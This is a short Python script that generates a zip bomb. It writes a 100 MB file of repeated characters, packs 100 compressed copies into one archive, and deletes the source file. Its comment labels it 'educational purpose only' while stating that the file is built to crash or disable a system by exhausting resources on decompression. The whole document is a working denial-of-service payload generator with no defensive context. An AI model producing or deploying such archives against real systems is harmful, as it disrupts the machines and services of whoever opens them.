import zipfile
import os

# educational purpose only: this script creates a zip bomb, 
# which is a file designed to crash or render a system unusable 
# by consuming excessive resources when decompressed.



# Parameters
FILENAME = "bomb.txt"
ZIPNAME = "zip_bomb.zip"
REPEAT_MB = 100      # Size of original file (in megabytes)
COPIES = 100        # Number of copies inside the ZIP

# Step 1: Create a highly compressible text file
print(f"Creating {FILENAME}...")
with open(FILENAME, "w") as f:
    f.write("A" * 1024 * 1024 * REPEAT_MB)  # REPEAT_MB of 'A's

# Step 2: Create a zip file with many copies of the same file
print(f"Creating zip bomb: {ZIPNAME}...")
with zipfile.ZipFile(ZIPNAME, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:
    for i in range(COPIES):
        zipf.write(FILENAME, arcname=f"{i}_{FILENAME}")

# Cleanup (optional)
os.remove(FILENAME)

print(f"Done! Created {ZIPNAME} with {COPIES} copies of a {REPEAT_MB}MB compressible file.")
